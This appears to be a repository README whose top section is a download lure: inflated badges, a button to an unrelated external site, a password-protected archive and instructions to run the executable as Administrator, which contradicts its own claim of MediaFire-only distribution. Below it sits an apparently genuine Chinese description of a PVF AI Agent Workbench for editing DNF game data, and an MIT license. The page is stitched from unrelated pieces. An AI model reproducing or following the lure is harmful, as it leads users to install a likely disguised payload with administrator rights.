<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# PVF AI Agent Workbench

这是一个让桌面 AI Agent 帮你查看和修改 DNF `Script.pvf` 的便携工作台。它自带运行环境、PVF 工具、知识路由和安全规则，适合不熟悉代码的用户。

## 能做什么

- 查询 PVF 文件、字段、名称、ID 和登记关系。
- 分析商店、装备、技能、任务、掉落、副本、APC、NUT 和跨文件依赖。
- 按“只读分析 → 预演 → 用户批准 → 生成独立的修改版 PVF → 生成后重新检查”执行受控修改。
- 规划同一 PVF 内的文件复制、新文件生命周期、跨版本比较和客户端兼容性检查。
- 经单独确认后，把已复查的 PVF 部署到 profile 指定的测试客户端，并恢复部署前版本。

## 安全原则

- 默认只读；生成阶段不覆盖源 PVF。
- 数字 ID 会先通过对应登记表确认。
- 中文等文字、既有 NUT 和高风险文件只开放经过验证的专用路线，不等于任意内容都能写。
- 多轮修改必须显式继承上一轮结果，避免退回已经验证的改动。
- 不默认修改客户端、NPK、IMG、UI 或其他客户端资源。
- 真实 PVF、客户端、本机 profile、运行报告和密钥不得放入仓库。

## 运行环境与文档

支持 64 位 Windows，随包携带 Node.js，不需要 npm、外部 MCP 或已下架插件。native 后端不可用时会自动进入只读模式；查询仍可用，但不能生成 PVF。

随包 native 后端是预编译文件；当前仓库尚未包含完整 Rust 源码和锁文件，不能据此完整重建该后端。


---

MIT License

Copyright (c) 2026 Qswhisper

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
